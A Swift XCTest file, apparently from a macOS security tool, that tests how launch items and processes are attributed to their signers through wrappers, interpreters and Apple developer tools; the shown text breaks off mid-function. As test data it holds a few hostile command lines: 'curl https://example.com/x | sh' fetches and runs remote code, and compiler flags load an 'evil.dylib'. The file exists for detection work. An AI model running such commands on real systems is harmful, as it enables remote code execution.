import XCTest
@testable import tattle

/// A launch item is signed, and a process named, by the code its command line runs: an
/// argument that only looks like that code must not stand in for it.
final class LaunchedCodeTests: XCTestCase {
    /// Apple's programs that run the code they are given, as they are on a Mac.
    private static let applesWrappers: Set<String> = [
        "/usr/bin/nohup", "/usr/bin/arch", "/usr/bin/caffeinate", "/usr/bin/time", "/usr/bin/nice", "/usr/bin/sandbox-exec",
        "/usr/bin/env", "/usr/bin/script", "/usr/bin/login", "/usr/bin/open", "/usr/bin/xargs", "/usr/bin/find",
        "/usr/bin/sudo", "/usr/bin/screen",
    ]

    /// How a file reads: as Apple's when it is one of Apple's wrappers or in `apple`, as
    /// Apple's with a signing identifier when `identifiers` gives one, and otherwise as signed
    /// by a publisher named for its path.
    private func reading(_ path: String, apple: Set<String> = [], identifiers: [String: String] = [:]) -> CodeSignature {
        if let identifier = identifiers[path] { return CodeSignature(signer: .apple, identifier: identifier) }
        return CodeSignature(signer: apple.contains(path) || Self.applesWrappers.contains(path) ? .apple : .developerID(name: path))
    }

    /// The signer Startup shows for a command line, with files read as `reading` reads them.
    private func signer(_ program: String, _ arguments: [String], apple: Set<String> = [],
                        identifiers: [String: String] = [:], environmentPath: String? = nil) -> CodeSignature.Signer? {
        CodeSignature.read(program: program, arguments: arguments, environmentPath: environmentPath) {
            self.reading($0, apple: apple, identifiers: identifiers)
        }?.signer
    }

    /// What a command line runs, read as Startup reads it, with files read as `reading` reads them.
    private func code(_ program: String, _ arguments: [String]) -> LaunchedCode {
        LaunchedCode.started(program: program, arguments: arguments) { LaunchedCode.Identity(path: $0, signature: self.reading($0)) }
    }

    private func script(_ path: String, run program: String) -> LaunchedCode {
        .script(path: path, interpreter: URL(fileURLWithPath: program).lastPathComponent)
    }

    func testInlineCodeIsUnnamedCodeWhateverPathFollowsIt() {
        let commands: [(String, [String])] = [
            ("/bin/bash", ["-c", "curl https://example.com/x | sh", "/usr/bin/true"]),
            ("/bin/sh", ["-ec", "payload", "/bin/ls"]),
            ("/bin/zsh", ["-o", "err_exit", "-c", "payload", "/bin/ls"]),
            ("/usr/bin/python3", ["-c", "import os", "/System/Library/CoreServices/Finder.app"]),
            ("/usr/bin/python3", ["-m", "http.server", "/bin/ls"]),
            ("/usr/bin/perl", ["-e", "1", "/bin/ls"]),
            ("/usr/bin/ruby", ["-e", "1", "/bin/ls"]),
            ("/usr/bin/osascript", ["-e", "delay 600", "/bin/ls"]),
            ("/opt/homebrew/bin/node", ["-e", "1", "/bin/ls"]),
            ("/usr/bin/expect", ["-c", "spawn x", "/bin/ls"]),
            ("/usr/bin/awk", ["{ print }", "/bin/ls"]),
        ]
        for (program, arguments) in commands {
            XCTAssertEqual(signer(program, arguments), .unnamed, "\(program) \(arguments)")
        }
    }

    func testTheScriptIsTheFirstOperandAfterTheOptionsAndTheirValues() {
        let commands: [(String, [String], String)] = [
            ("/usr/bin/perl", ["-I", "/bin", "/x/a.pl", "/bin/ls"], "/x/a.pl"),
            ("/usr/bin/python3", ["-W", "ignore", "/x/a.py"], "/x/a.py"),
            ("/bin/bash", ["--rcfile", "/bin/ls", "/x/run.sh"], "/x/run.sh"),
            ("/bin/bash", ["+o", "posix", "/x/run.sh"], "/x/run.sh"),
            ("/usr/bin/awk", ["-F", ":", "-f", "/x/p.awk", "/bin/ls"], "/x/p.awk"),
            ("/usr/bin/java", ["-cp", "/bin", "-jar", "/x/a.jar"], "/x/a.jar"),
            ("/usr/bin/tclsh", ["-encoding", "utf-8", "/x/t.tcl"], "/x/t.tcl"),
            ("/usr/bin/perl5.34", ["/x/a.pl"], "/x/a.pl"),
            ("/opt/homebrew/bin/python3.12", ["-u", "/x/a.py"], "/x/a.py"),
        ]
        for (program, arguments, path) in commands {
            XCTAssertEqual(code(program, arguments), script(path, run: program), "\(program) \(arguments)")
        }
    }

    func testEachInterpreterReadsItsOptionsByItsOwnManualPage() {
        let scripts: [(String, [String], String)] = [
            ("/bin/zsh", ["-O", "/x/run.sh", "/bin/ls"], "/x/run.sh"),
            ("/bin/bash", ["-O", "extglob", "/x/run.sh"], "/x/run.sh"),
            ("/usr/bin/perl", ["-l012", "/x/a.pl"], "/x/a.pl"),
            ("/usr/bin/perl", ["-0x1F", "/x/a.pl"], "/x/a.pl"),
            // Outside shells, a word that starts with "+" is a file name.
            ("/usr/bin/python3", ["+run.py", "/bin/ls"], "+run.py"),
            ("/usr/bin/perl", ["+run.pl", "/bin/ls"], "+run.pl"),
        ]
        for (program, arguments, path) in scripts {
            XCTAssertEqual(code(program, arguments), script(path, run: program), "\(program) \(arguments)")
        }
        let inline: [(String, [String])] = [
            ("/usr/bin/perl", ["-lne", "/x/code", "/bin/ls"]),
            ("/usr/bin/perl", ["-0pe", "/x/code", "/bin/ls"]),
        ]
        for (program, arguments) in inline {
            XCTAssertEqual(signer(program, arguments), .unnamed, "\(program) \(arguments)")
        }
        let oneLiner = ProcessEntry.name(path: "/usr/bin/perl", arguments: ["perl", "-le", "print 1/2"], command: "perl")
        XCTAssertEqual(oneLiner.name, "perl")
        XCTAssertEqual(oneLiner.interpreter, "perl")
    }

    func testAScriptReadsAsAScriptWhoeverSignedItsFile() {
        // A script rarely carries a signature, and no interpreter runs a signed binary as its
        // script: a signed file in the script's place was read there by mistake.
        let commands: [(String, [String])] = [
            ("/opt/homebrew/bin/node", ["--diagnostic-dir", "/usr/bin/true", "/x/evil.js"]),
            ("/opt/homebrew/bin/node", ["--diagnostic-dir", "/Applications/Slack.app/Contents/MacOS/Slack", "/x/evil.js"]),
            ("/bin/bash", ["/bin/ls"]),
            ("/bin/sh", ["/x/run.sh"]),
            ("/usr/bin/java", ["-jar", "/x/server.jar"]),
        ]
        for (program, arguments) in commands {
            XCTAssertEqual(signer(program, arguments, apple: ["/usr/bin/true", "/bin/ls"]), .script, "\(program) \(arguments)")
        }
    }

    func testAScriptTheCommandLineDoesNotLocateIsAScript() {
        for (program, arguments) in [("/bin/bash", ["run.sh"]), ("/bin/sh", [])] {
            XCTAssertEqual(signer(program, arguments), .script, "\(program) \(arguments)")
        }
        XCTAssertEqual(signer("/usr/bin/java", ["-cp", "/x", "Main"]), .unnamed, "a class by name")
    }

    func testAWrapperIsSignedByTheProgramItRuns() {
        let commands: [(String, [String], String)] = [
            ("/usr/bin/nohup", ["/x/agent"], "/x/agent"),
            ("/usr/bin/arch", ["-arm64", "/x/agent", "-v"], "/x/agent"),
            ("/usr/bin/arch", ["-arch", "arm64", "/x/agent"], "/x/agent"),
            ("/usr/bin/caffeinate", ["-i", "-t", "60", "/x/agent"], "/x/agent"),
            ("/usr/bin/caffeinate", ["-dw", "1", "/x/agent"], "/x/agent"),
            ("/usr/bin/time", ["-o", "/bin/ls", "/x/agent"], "/x/agent"),
            ("/usr/bin/nice", ["-n", "5", "/x/agent"], "/x/agent"),
            ("/usr/bin/sandbox-exec", ["-f", "/bin/ls", "/x/agent"], "/x/agent"),
            ("/usr/bin/env", ["-u", "HOME", "PATH=/bin", "/x/agent"], "/x/agent"),
            ("/usr/bin/script", ["-q", "/dev/null", "/x/agent"], "/x/agent"),
            ("/usr/bin/login", ["-pf", "someone", "/x/agent"], "/x/agent"),
            ("/usr/bin/open", ["-a", "/Applications/X.app"], "/Applications/X.app"),
            ("/usr/bin/open", ["-a", "/Applications/X.app", "--args", "/bin/ls"], "/Applications/X.app"),
            ("/usr/bin/open", ["-g", "/Applications/X.app", "--args", "/bin/ls"], "/Applications/X.app"),
            ("/usr/bin/open", ["/Applications/X.app/"], "/Applications/X.app/"),
            // Letters group, as getopt reads them, and -a takes the rest of its word.
            ("/usr/bin/open", ["-ga", "/Applications/X.app"], "/Applications/X.app"),
            ("/usr/bin/open", ["-a/Applications/X.app"], "/Applications/X.app"),
            ("/usr/bin/open", ["-i", "/x/in", "-o", "/x/out", "/Applications/X.app"], "/Applications/X.app"),
            // Long options read as their letters, by a prefix of only one name too, as
            // getopt_long reads them.
            ("/usr/bin/open", ["--fresh", "--background", "--hide", "--wait-apps", "--new", "/Applications/X.app"], "/Applications/X.app"),
            ("/usr/bin/open", ["--back", "/Applications/X.app"], "/Applications/X.app"),
            ("/usr/bin/open", ["--stdin", "/x/in", "--stdout=/x/out", "--stderr", "/x/err", "/Applications/X.app"], "/Applications/X.app"),
            ("/usr/bin/open", ["--env", "A=1", "--ar", "arm64", "/Applications/X.app"], "/Applications/X.app"),
            ("/usr/bin/open", ["--", "/Applications/X.app"], "/Applications/X.app"),
        ]
        for (program, arguments, code) in commands {
            XCTAssertEqual(signer(program, arguments), .developerID(name: code), "\(program) \(arguments)")
        }
        XCTAssertEqual(signer("/usr/bin/nohup", ["/bin/sh", "-c", "payload", "/bin/ls"]), .unnamed)
        XCTAssertEqual(code("/usr/bin/nohup", ["/usr/bin/env", "python3", "/x/a.py"]), script("/x/a.py", run: "python3"))
    }

    func testApplesProgramIsKnownByItsSigningIdentifierWhateverItsPathIsCalled() {
        let commands: [(String, [String], [String: String], CodeSignature.Signer)] = [
            ("/Users/x/agent", ["-c", "payload"], ["/Users/x/agent": "com.apple.zsh"], .unnamed),
            ("/bin/BASH", ["-c", "payload"], ["/bin/BASH": "com.apple.bash"], .unnamed),
            ("/Users/x/run", ["/x/agent"], ["/Users/x/run": "com.apple.nohup", "/x/agent": "com.apple.zsh"], .script),
            ("/usr/bin/python3", ["-c", "payload"], ["/usr/bin/python3": "com.apple.dt.xcode_select.tool-shim-public"], .unnamed),
        ]
        for (program, arguments, identifiers, code) in commands {
            XCTAssertEqual(signer(program, arguments, identifiers: identifiers), code, "\(program) \(arguments)")
        }
    }

    func testAProgramThatIsNotApplesRunsItsOwnCodeWhateverItNames() {
        // A program named like a wrapper runs its own code, whatever it names.
        XCTAssertEqual(signer("/Users/x/nohup", ["/bin/ls"], apple: ["/bin/ls"]), .developerID(name: "/Users/x/nohup"))
        XCTAssertEqual(signer("/Users/x/env", ["/usr/bin/nice", "/bin/ls"], apple: ["/usr/bin/nice", "/bin/ls"]), .developerID(name: "/Users/x/env"))
        XCTAssertEqual(signer("/Users/x/env", ["/Applications/Zoom.app/Contents/MacOS/zoom.us"]), .developerID(name: "/Users/x/env"), "not the publisher it names")
        XCTAssertEqual(signer("/Users/x/nohup", ["agent"]), .developerID(name: "/Users/x/nohup"), "nor nothing when what it names is not found")
        XCTAssertEqual(signer("/Users/x/env", ["-S", "payload"]), .developerID(name: "/Users/x/env"))
        XCTAssertEqual(signer("/usr/bin/nohup", ["/Users/x/env", "/bin/ls"], apple: ["/usr/bin/nohup", "/bin/ls"]), .developerID(name: "/Users/x/env"))
        XCTAssertEqual(signer("/Users/x/nohup", ["/bin/sh", "-c", "payload"], apple: ["/bin/sh"]), .unnamed, "code an interpreter runs reads as such whoever starts it")
        XCTAssertEqual(signer("/usr/bin/nohup", ["/bin/ls"], apple: ["/usr/bin/nohup", "/bin/ls"]), .launchItem(applesProgram: "ls"))
    }

    func testAProgramNamedWithoutAPathIsFoundAsTheJobFindsIt() throws {
        let folder = FileManager.default.temporaryDirectory.appending(path: UUID().uuidString)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let ls = folder.appending(path: "ls")
        try Data("#!/bin/sh\n".utf8).write(to: ls)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: ls.path)

        XCTAssertEqual(signer("true", []), .developerID(name: "/usr/bin/true"), "launchd looks a bare program up on its standard path")
        XCTAssertEqual(signer("/usr/bin/nohup", ["true"]), .developerID(name: "/usr/bin/true"))
        XCTAssertEqual(signer("/usr/bin/nohup", ["ls"], environmentPath: "\(folder.path):/bin"), .developerID(name: ls.path), "on the PATH the plist sets")
        XCTAssertEqual(signer("/usr/bin/env", ["PATH=\(folder.path):/bin", "ls"]), .developerID(name: ls.path), "on the PATH env sets")
        XCTAssertEqual(signer("ls", [], environmentPath: "\(folder.path):/bin"), .developerID(name: "/bin/ls"), "launchd's own lookup ignores the job's PATH")
        // Relative to a working directory the command line does not give.
        XCTAssertNil(signer("/usr/bin/nohup", ["bin/ls"]))
        XCTAssertNil(signer("bin/ls", []))
        XCTAssertNil(signer("/usr/bin/nohup", ["ls"], environmentPath: ":/bin"), "an empty PATH entry is the working directory")
        XCTAssertNil(signer("/usr/bin/env", ["-P", folder.path, "ls"]))
        XCTAssertNil(signer("/usr/bin/nohup", ["no-such-program-anywhere"]))
    }

    func testMoreOfApplesProgramsRunTheCodeTheyAreGiven() {
        let commands: [(String, [String], String)] = [
            ("/usr/bin/sudo", ["-u", "root", "/x/agent"], "/x/agent"),
            ("/usr/bin/sudo", ["--user", "root", "/x/agent"], "/x/agent"),
            ("/usr/bin/sudo", ["--prompt", "/bin/ls", "/x/agent"], "/x/agent"),
            ("/usr/bin/sudo", ["--chdir=/bin", "/x/agent"], "/x/agent"),
            ("/usr/bin/screen", ["-dmS", "name", "/x/agent"], "/x/agent"),
        ]
        for (program, arguments, code) in commands {
            XCTAssertEqual(signer(program, arguments), .developerID(name: code), "\(program) \(arguments)")
        }
        let files: [(String, [String], String)] = [
            ("/usr/bin/make", ["-C", "/x", "-f", "/x/Makefile", "all"], "/x/Makefile"),
            ("/usr/bin/swift", ["-I", "/bin", "/x/a.swift"], "/x/a.swift"),
            ("/usr/bin/wish", ["-geometry", "10x10", "/x/a.tcl"], "/x/a.tcl"),
        ]
        for (program, arguments, path) in files {
            XCTAssertEqual(code(program, arguments), script(path, run: program), "\(program) \(arguments)")
        }
        let unnamed: [(String, [String])] = [
            ("/usr/bin/make", ["-C", "/x", "all"]),
            ("/usr/bin/make", []),
            ("/usr/bin/swift", ["-e", "print(1)", "/bin/ls"]),
        ]
        for (program, arguments) in unnamed {
            XCTAssertEqual(signer(program, arguments), .unnamed, "\(program) \(arguments)")
        }
        XCTAssertNil(signer("/usr/bin/sudo", ["-s", "/x/agent"]), "a shell runs the command")
        XCTAssertNil(signer("/usr/bin/sudo", ["--login", "/x/agent"]), "a shell runs the command")
        XCTAssertNil(signer("/usr/bin/screen", ["-S", "name", "-X", "stuff", "/x/agent"]), "a command to a running session")
    }

    func testFindIsSignedByTheProgramItsExecRuns() {
        XCTAssertEqual(signer("/usr/bin/find", ["/x", "-name", "*.log", "-exec", "/x/agent", "{}", ";"]), .developerID(name: "/x/agent"))
        XCTAssertEqual(signer("/usr/bin/find", ["/x", "-execdir", "true", "+"]), .developerID(name: "/usr/bin/true"))
        XCTAssertEqual(signer("/usr/bin/find", ["/x", "-exec", "/bin/sh", "-c", "payload", ";"]), .unnamed)
        XCTAssertEqual(signer("/usr/bin/find", ["/x", "-name", "a"]), .launchItem(applesProgram: "find"), "find runs only its own code")
        XCTAssertNil(signer("/usr/bin/find", ["/x", "-exec", "/usr/bin/true", ";", "-ok", "/x/agent", ";"]), "two programs")
    }

    func testAWrapperWhoseProgramIsNotNamedHasNoSigner() {
        let commands: [(String, [String])] = [
            ("/usr/bin/open", ["-a", "Safari", "/bin/ls"]),
            ("/usr/bin/open", ["-b", "com.apple.Safari"]),
            // An app runs the documents it is given as it likes; a document, by an app the
            // command line does not name.
            ("/usr/bin/open", ["-a", "/Applications/X.app", "/x/run.command"]),
            ("/usr/bin/open", ["/x/run.command", "-a", "/Applications/X.app"]),
            ("/usr/bin/open", ["/Applications/X.app", "/x/run.command"]),
            ("/usr/bin/open", ["run.command"]),
            ("/usr/bin/open", ["/x/run.command"]),
            ("/usr/bin/open", ["-e", "/x/notes.txt"]),
            ("/usr/bin/open", ["/bin/ls"]),
            // TextEdit, the default text editor, Finder or a header's app opens what is given.
            ("/usr/bin/open", ["-t", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["-e", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["-f", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["-R", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["-h", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["-gR", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["-gb", "com.apple.Safari"]),
            ("/usr/bin/open", ["--reveal", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["--rev", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["--header", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["--url", "file:///System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["--url=file:///System/Applications/Calculator.app"]),
            // open refuses a long option it does not know, the prefix of two, or a value for one
            // that takes none, and opens nothing.
            ("/usr/bin/open", ["--bogus", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["--h", "/System/Applications/Calculator.app"]),
            ("/usr/bin/open", ["--new=1", "/System/Applications/Calculator.app"]),
            ("/usr/bin/env", ["-S", "/bin/sh -c payload", "/bin/ls"]),
            ("/usr/bin/nohup", []),
            // xargs adds words from its standard input to the command it runs.
            ("/usr/bin/xargs", ["-n", "1", "/x/agent"]),
            ("/usr/bin/xargs", ["/usr/bin/open", "-a", "/System/Applications/Utilities/Terminal.app"]),
            ("/usr/bin/xargs", ["/usr/bin/find", "/x", "-maxdepth", "0"]),
        ]
        for (program, arguments) in commands {
            XCTAssertNil(signer(program, arguments), "\(program) \(arguments)")
        }
    }

    func testAProgramIsSignedByItself() {
        XCTAssertEqual(signer("/bin/ls", ["-l", "/x/agent"]), .developerID(name: "/bin/ls"))
    }

    func testAProcessRunningCodeThatIsNotItsExecutableIsMarked() {
        let inline = ProcessEntry.name(path: "/bin/bash", arguments: ["bash", "-c", "curl x | sh", "/usr/bin/true"], command: "bash")
        XCTAssertEqual(inline.name, "bash", "not named after a path that follows the code")
        XCTAssertEqual(inline.interpreter, "bash")
        XCTAssertEqual(ProcessEntry.name(path: "/usr/bin/osascript", arguments: ["osascript", "-e", "delay 600"], command: "osascript").interpreter, "osascript")
        let relative = ProcessEntry.name(path: "/bin/bash", arguments: ["bash", "run.sh"], command: "bash")
        XCTAssertEqual(relative.name, "run.sh")
        XCTAssertEqual(relative.interpreter, "bash")
        let package = ProcessEntry.name(path: "/opt/node/bin/node", arguments: ["node", "."], command: "node")
        XCTAssertEqual(package.name, "node", "the package in its working directory, which the path does not name")
        XCTAssertEqual(package.interpreter, "node")
        XCTAssertEqual(ProcessEntry.name(path: "/opt/node/bin/node", arguments: ["node", "dist/"], command: "node").name, "node")
        XCTAssertEqual(ProcessEntry.name(path: "/opt/node/bin/node", arguments: ["node", ".."], command: "node").name, "node")
        for folder in [".", "./", "..", "../", "dist/", "/x/app/."] {
            XCTAssertEqual(code("/opt/node/bin/node", [folder]), .unnamed(interpreter: "node"), "\(folder) is not a script file")
        }
        let unreadable = ProcessEntry.name(path: "/bin/bash", arguments: nil, command: "bash")
        XCTAssertEqual(unreadable.name, "bash")
        XCTAssertEqual(unreadable.interpreter, "bash", "another user's arguments cannot be read, so what its shell runs is unknown")
        let perl = ProcessEntry.name(path: "/usr/bin/perl5.34", arguments: ["perl5.34", "/x/a.pl"], command: "perl5.34")
        XCTAssertEqual(perl.name, "a.pl")
        XCTAssertEqual(perl.interpreter, "perl5.34")
        let wrapper = ProcessEntry.name(path: "/usr/bin/caffeinate", arguments: ["caffeinate", "-i", "/x/agent"], command: "caffeinate")
        XCTAssertEqual(wrapper.name, "caffeinate", "a running wrapper runs its own code: the program is its child")
        XCTAssertNil(wrapper.interpreter)
    }

    func testAnInterpreterLaunchdStartsOnItsStandardInputRunsAScript() {
        // launchd gives a job no terminal: its standard input is a file the plist names, or a
        // pipe, so what it reads is a script. Under a terminal, a person may be typing.
        let job = ProcessEntry.name(path: "/bin/sh", arguments: ["sh"], command: "sh", startedByLaunchd: true)
        XCTAssertEqual(job.name, "sh")
        XCTAssertEqual(job.interpreter, "sh")
        XCTAssertNil(ProcessEntry.name(path: "/bin/zsh", arguments: ["-zsh"], command: "zsh").interpreter)
    }

    func testPythonIsAnInterpreterInProcessesUnderItsFrameworkName() {
        let python = "/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python"
        let apple = CodeSignature(signer: .apple, identifier: "com.apple.python3")
        let inline = ProcessEntry.name(path: python, arguments: [python, "-c", "payload"], command: "Python", signature: apple)
        XCTAssertEqual(inline.interpreter, "Python")
        let script = ProcessEntry.name(path: python, arguments: [python, "/x/a.py"], command: "Python", signature: apple)
        XCTAssertEqual(script.name, "a.py")
        let brew = "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Resources/Python.app/Contents/MacOS/Python"
        XCTAssertEqual(ProcessEntry.name(path: brew, arguments: [brew, "/x/a.py"], command: "Python").name, "a.py", "known by name when not Apple's")
        let renamed = ProcessEntry.name(path: "/x/agent", arguments: ["agent", "-c", "payload"], command: "agent",
                                        signature: CodeSignature(signer: .apple, identifier: "com.apple.zsh"))
        XCTAssertEqual(renamed.interpreter, "agent", "Apple's program by its signing identifier")
    }

    private static let toolchain = "/Library/Developer/CommandLineTools/usr/bin"
    private static let xcode = "/Applications/Xcode.app/Contents/Developer"
    private static let shim = "com.apple.dt.xcode_select.tool-shim-public"
    /// The toolchain's swift tools are links to its frontend; `/usr/bin` has Apple's stubs.
    private static let developerIdentifiers: [String: String] = [
        "\(toolchain)/swift-frontend": "com.apple.swift-frontend", "\(toolchain)/swift": "com.apple.swift-frontend",
        "\(toolchain)/swiftc": "com.apple.swift-frontend", "\(toolchain)/swift-symbolgraph-extract": "com.apple.swift-frontend",
        "\(toolchain)/clang": "com.apple.clang", "\(xcode)/usr/bin/xcodebuild": "com.apple.dt.xcodebuild",
        "\(xcode)/Toolchains/XcodeDefault.xctoolchain/usr/bin/swift-frontend": "com.apple.swift-frontend",
        "/Library/Developer/Toolchains/swift-6.2-RELEASE.xctoolchain/usr/bin/swift-driver": "com.apple.swift-driver",
        "/usr/bin/swift": shim, "/usr/bin/swiftc": shim, "/usr/bin/git": shim,
        "/usr/bin/xcodebuild": "com.apple.dt.xcode_select.xtool-shim-public",
        "/usr/bin/devicectl": "com.apple.dt.xcode_select.libdevtool-shim-public",
    ]

    func testASwiftScriptReadsAsAScript() {
        // swift runs a script by replacing itself with its frontend in immediate mode.
        let frontend = "\(Self.toolchain)/swift-frontend"
        let apple = CodeSignature(signer: .apple, identifier: "com.apple.swift-frontend")
        let script = ProcessEntry.name(path: frontend, arguments: [frontend, "-frontend", "-interpret", "/x/a.swift", "-sdk", "/x/sdk"],
                                       command: "swift-frontend", signature: apple)
        XCTAssertEqual(script.name, "a.swift")
        XCTAssertEqual(script.interpreter, "swift-frontend")
        XCTAssertFalse(script.runsUnnamedCode)
        // -interpret is a mode, not an option the script follows: it may come after the script.
        let after = ProcessEntry.name(path: frontend, arguments: [frontend, "-frontend", "-interpret", "-sdk", "/x/sdk", "/x/a.swift"],
                                      command: "swift-frontend", signature: apple)
        XCTAssertEqual(after.name, "a.swift")
        let lines: [(String, [String])] = [
            (frontend, ["-frontend", "-sdk", "/x/sdk", "/x/a.swift", "-interpret"]),
            (frontend, ["-interpret", "/x/a.swift"]),
            ("/usr/bin/swift", ["-frontend", "/x/a.swift", "-interpret"]),
            ("/usr/bin/swiftc", ["-frontend", "-interpret", "/x/a.swift"]),
            // The driver passes -interpret on to its frontend job.
            ("/usr/bin/swiftc", ["-wmo", "-typecheck", "-sdk", "/x/sdk", "-Xfrontend", "-interpret", "/x/a.swift"]),
            // The swift driver runs the file it is given; the toolchain's swift is a link to the
            // frontend, which acts as the driver its file name says.
            ("/usr/bin/swift", ["/x/a.swift"]),
            ("/usr/bin/swift", ["./a"]),
            ("\(Self.toolchain)/swift", ["/x/a.swift"]),
        ]
        for (program, arguments) in lines {
            XCTAssertEqual(signer(program, arguments, identifiers: Self.developerIdentifiers), .script, "\(program) \(arguments)")
        }
        // A first word without a "." or "/" names another program beside the driver: `swift
        // build` runs swift-build.
        XCTAssertEqual(signer("/usr/bin/swift", ["build"], identifiers: Self.developerIdentifiers), .unnamed)
        let elsewhere = ProcessEntry.name(path: "/Users/x/bin/tool", arguments: ["tool", "-frontend", "-interpret", "/x/a.swift"],
                                          command: "tool", signature: apple)
        XCTAssertEqual(elsewhere.name, "a.swift", "Apple's frontend is known by its signing identifier wherever it is")
    }

    func testXcrunIsOneOfApplesDeveloperTools() {
        var identifiers = Self.developerIdentifiers
        identifiers["/usr/bin/xcrun"] = "com.apple.xcrun"
        identifiers["/Users/x/lldb"] = "com.apple.xcrun"
        identifiers["/Users/x/swift"] = "com.apple.xcrun"
        identifiers["/bin/ls"] = "com.apple.ls"
        identifiers["/usr/bin/leaks"] = "com.apple.dt.SamplingTools.leaks"
        // It looks in a developer folder before the PATH.
        XCTAssertEqual(signer("/usr/bin/xcrun", ["leaks", "/bin/ls"], identifiers: identifiers), .unnamed)
        XCTAssertEqual(signer("/usr/bin/xcrun", ["ls"], identifiers: identifiers), .unnamed)
        XCTAssertEqual(signer("/usr/bin/xcrun", ["--sdk", "macosx", "/x/tool"], identifiers: identifiers), .unnamed)
        // Under another name it is that tool, and the arguments are the tool's.
        XCTAssertEqual(signer("/Users/x/lldb", ["/bin/ls", "-b", "-s", "/x/cmds"], identifiers: identifiers), .unnamed)
        // A script it runs is a script.
        XCTAssertEqual(signer("/usr/bin/xcrun", ["swift", "/x/a.swift"], identifiers: identifiers), .script)
        XCTAssertEqual(signer("/Users/x/swift", ["/x/a.swift"], identifiers: identifiers), .script)
    }

    func testApplesDeveloperToolsRunUnnamedCodeUnlessTheyRunAScript() {
        // A compiler loads the plugins and passes it is told to, a linker the libraries, git a
        // repository's hooks: what they run is not Apple's to say.
        let lines: [(String, [String])] = [
            ("\(Self.toolchain)/swift-frontend", ["-frontend", "-c", "/x/a.swift",
                                                  "-plugin-path", "/Library/Developer/CommandLineTools/usr/lib/swift/host/plugins"]),
            ("\(Self.toolchain)/swift-frontend", ["-frontend", "-c", "/x/a.swift", "-Xllvm", "-load=/x/evil.dylib"]),
            ("\(Self.toolchain)/swiftc", ["-o", "/x/a", "/x/a.swift"]),
            ("\(Self.toolchain)/swift-symbolgraph-extract", ["-module-name", "Foo", "-output-dir", "/x/symbolgraph"]),
            ("\(Self.toolchain)/clang", ["-fplugin=/x/evil.dylib", "-c", "/x/a.c"]),
            ("\(Self.xcode)/Toolchains/XcodeDefault.xctoolchain/usr/bin/swift-frontend", ["@/x/a.rsp"]),
            ("\(Self.xcode)/usr/bin/xcodebuild", ["-project", "/x/X.xcodeproj"]),
            ("/Library/Developer/Toolchains/swift-6.2-RELEASE.xctoolchain/usr/bin/swift-driver",
             ["-driver-use-frontend-path", "/x/frontend", "/x/a.swift"]),
            // Apple's stubs run the tool of the Xcode or Command Line Tools xcode-select chose.
            ("/usr/bin/swiftc", ["-o", "/x/a", "/x/a.swift"]),
            ("/usr/bin/git", ["pull"]),
            ("/usr/bin/xcodebuild", ["-version"]),
            ("/usr/bin/devicectl", ["list", "devices"]),
            ("/usr/bin/nohup", ["/usr/bin/swiftc", "/x/a.swift"]),
        ]
        for (program, arguments) in lines {
            XCTAssertEqual(signer(program, arguments, identifiers: Self.developerIdentifiers), .unnamed, "\(program) \(arguments)")
        }
        let frontend = "\(Self.toolchain)/swift-frontend"
        let compile = ProcessEntry.name(path: frontend, arguments: [frontend, "-frontend", "-c", "/x/a.swift", "-sdk", "/x/sdk"],
                                        command: "swift-frontend", signature: CodeSignature(signer: .apple, identifier: "com.apple.swift-frontend"))
        XCTAssertEqual(compile.name, "swift-frontend")
        XCTAssertEqual(compile.interpreter, "swift-frontend")
        XCTAssertTrue(compile.runsUnnamedCode)
        let other = "/Library/Developer/Toolchains/other.xctoolchain/usr/bin/tool"
        XCTAssertEqual(signer(other, []), .developerID(name: other), "a program that is not Apple's has its own signer")
    }

    func testApplesSwiftToolsClangAndLdAreDeveloperToolsWhereverTheyAre() {
        // A copy keeps Apple's signature, and loads what it is told to as the original does.
        let lines: [(String, String, [String])] = [
            ("/Users/x/bin/swift-frontend", "com.apple.swift-frontend", ["-frontend", "-c", "/x/a.swift", "-load-plugin-library", "/x/evil.dylib"]),
            ("/Users/x/bin/swift-driver", "com.apple.swift-driver", ["-driver-use-frontend-path", "/x/frontend", "/x/a.swift"]),
            ("/Users/x/bin/swift-package", "com.apple.swift-package", ["build"]),
            ("/Users/x/bin/swift-build-tool", "com.apple.swift-build-tool", ["-f", "/x/build.yaml"]),
            ("/Users/x/bin/swift-plugin-server", "com.apple.swift-plugin-server", []),
            ("/Users/x/bin/sourcekit-lsp", "com.apple.sourcekit-lsp", []),
            ("/Users/x/bin/cc", "com.apple.clang", ["-fplugin=/x/evil.dylib", "-c", "/x/a.c"]),
            ("/Users/x/bin/ld", "com.apple.ld", ["-lto_library", "/x/evil.dylib", "/x/a.o"]),
            ("/Users/x/bin/ld-classic", "com.apple.ld-classic", ["/x/a.o"]),
        ]
        for (program, identifier, arguments) in lines {
            XCTAssertEqual(signer(program, arguments, identifiers: [program: identifier]), .unnamed, "\(program) \(arguments)")
        }
        let copy = ProcessEntry.name(path: "/Users/x/bin/cc", arguments: ["cc", "-c", "/x/a.c"], command: "cc",
                                     signature: CodeSignature(signer: .apple, identifier: "com.apple.clang"))
        XCTAssertEqual(copy.interpreter, "cc")
        XCTAssertTrue(copy.runsUnnamedCode)
    }

    func testALinkToApplesDeveloperToolIsTheTool() throws {
        let folder = FileManager.default.temporaryDirectory.appending(path: UUID().uuidString)
        let bin = folder.appending(path: "Fake.xctoolchain/usr/bin")
        try FileManager.default.createDirectory(at: bin, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: folder.appending(path: "bin"), withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        try Data().write(to: bin.appending(path: "clang"))
